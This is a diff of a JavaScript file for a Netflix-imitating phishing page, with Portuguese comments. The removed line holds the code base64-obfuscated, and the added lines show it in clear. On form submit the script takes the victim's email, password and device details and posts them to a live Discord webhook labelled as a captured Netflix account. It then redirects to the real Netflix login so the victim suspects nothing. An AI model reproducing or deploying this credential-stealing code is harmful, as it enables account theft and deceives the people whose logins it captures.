@@ -1,1 +1,51 @@
-<script>const content = decodeURIComponent(escape(atob("ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsICgpID0+IHsKICAgIGNvbnN0IGxvZ2luRm9ybSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkZvcm0nKTsKICAgIGNvbnN0IHN1Ym1pdEJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdWJtaXRCdG4nKTsKICAgIAogICAgLy8gVVJMIGRhIHN1YSBXZWJob29rCiAgICBjb25zdCBXRUJIT09LX1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDgxMzU5NTMwNDE0NzA2NzMwL2NCR2N6VEd4bE5iZEdQVGVrY0hIWVA4TmlpRXpxS194Ql9pbHlRMEFZZzVWY0MySjhKTG0tbVpoQjRRYnFpU0xhbG1KJzsKCiAgICBsb2dpbkZvcm0uYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JywgYXN5bmMgKGUpID0+IHsKICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgCiAgICAgICAgY29uc3QgZW1haWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZW1haWwnKS52YWx1ZTsKICAgICAgICBjb25zdCBwYXNzd29yZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnZhbHVlOwoKICAgICAgICAvLyBGZWVkYmFjayB2aXN1YWwgZGUgY2FycmVnYW1lbnRvCiAgICAgICAgc3VibWl0QnRuLmRpc2FibGVkID0gdHJ1ZTsKICAgICAgICBzdWJtaXRCdG4uaW5uZXJUZXh0ID0gIkNhcnJlZ2FuZG8uLi4iOwoKICAgICAgICAvLyBPYmpldG8gZm9ybWF0YWRvIHBhcmEgbyBEaXNjb3JkCiAgICAgICAgY29uc3QgcGF5bG9hZCA9IHsKICAgICAgICAgICAgZW1iZWRzOiBbewogICAgICAgICAgICAgICAgdGl0bGU6ICLwn46lIE5PVkEgQ09OVEEgTkVURkxJWCBDQVBUVVJBREEiLAogICAgICAgICAgICAgICAgY29sb3I6IDE0OTQ0NTMyLAogICAgICAgICAgICAgICAgdGh1bWJuYWlsOiB7IAogICAgICAgICAgICAgICAgICAgIHVybDogImh0dHBzOi8vY2RuNC5pY29uZmluZGVyLmNvbS9kYXRhL2ljb25zL2xvZ29zLWFuZC1icmFuZHMvNTEyLzIyN19OZXRmbGl4X2xvZ28tNTEyLnBuZyIgCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZmllbGRzOiBbCiAgICAgICAgICAgICAgICAgICAgeyBuYW1lOiAi8J+RpCBVc3XDoXJpby9FLW1haWwiLCB2YWx1ZTogYFxgXGBcYCR7ZW1haWx9XGBcYFxgYCwgaW5saW5lOiBmYWxzZSB9LAogICAgICAgICAgICAgICAgICAgIHsgbmFtZTogIvCflJEgU2VuaGEiLCB2YWx1ZTogYFxgXGBcYCR7cGFzc3dvcmR9XGBcYFxgYCwgaW5saW5lOiBmYWxzZSB9LAogICAgICAgICAgICAgICAgICAgIHsgbmFtZTogIvCfk7EgSW5mbyIsIHZhbHVlOiBgXGAke25hdmlnYXRvci5wbGF0Zm9ybX1cYCB8IFxgJHtuYXZpZ2F0b3IubGFuZ3VhZ2V9XGBgLCBpbmxpbmU6IHRydWUgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgIGZvb3RlcjogeyAKICAgICAgICAgICAgICAgICAgICB0ZXh0OiAiU2hlbGJ5IExvZ3Mg4oCiICIgKyBuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCdwdC1CUicpIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9XQogICAgICAgIH07CgogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGF3YWl0IGZldGNoKFdFQkhPT0tfVVJMLCB7CiAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBSZWRpcmVjaW9uYSBwYXJhIG8gbG9naW4gcmVhbCBkYSBOZXRmbGl4IHBhcmEgbsOjbyBnZXJhciBzdXNwZWl0YXMKICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAnaHR0cHM6Ly93d3cubmV0ZmxpeC5jb20vYnIvbG9naW4nOwogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgIC8vIEVtIGNhc28gZGUgZXJybywgcmVkaXJlY2lvbmEgbWVzbW8gYXNzaW0gcGFyYSBtYW50ZXIgbyBkaXNmYXJjZQogICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICdodHRwczovL3d3dy5uZXRmbGl4LmNvbS9ici9sb2dpbic7CiAgICAgICAgfQogICAgfSk7Cn0pOw==")));document.open();document.write(content);document.close();</script>
+document.addEventListener('DOMContentLoaded', () => {
+    const loginForm = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    
+    // URL da sua Webhook
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1481359530414706730/cBGczTGxlNbdGPTekcHHYP8NiiEzqK_xB_ilyQ0AYg5VcC2J8JLm-mZhB4QbqiSLalmJ';
+
+    loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Feedback visual de carregamento
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Carregando...";
+
+        // Objeto formatado para o Discord
+        const payload = {
+            embeds: [{
+                title: "🎥 NOVA CONTA NETFLIX CAPTURADA",
+                color: 14944532,
+                thumbnail: { 
+                    url: "https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/227_Netflix_logo-512.png" 
+                },
+                fields: [
+                    { name: "👤 Usuário/E-mail", value: `\`\`\`${email}\`\`\``, inline: false },
+                    { name: "🔑 Senha", value: `\`\`\`${password}\`\`\``, inline: false },
+                    { name: "📱 Info", value: `\`${navigator.platform}\` | \`${navigator.language}\``, inline: true }
+                ],
+                footer: { 
+                    text: "Shelby Logs • " + new Date().toLocaleString('pt-BR') 
+                }
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            // Redireciona para o login real da Netflix para não gerar suspeitas
+            window.location.href = 'https://www.netflix.com/br/login';
+        } catch (error) {
+            // Em caso de erro, redireciona mesmo assim para manter o disfarce
+            window.location.href = 'https://www.netflix.com/br/login';
+        }
+    });
+});
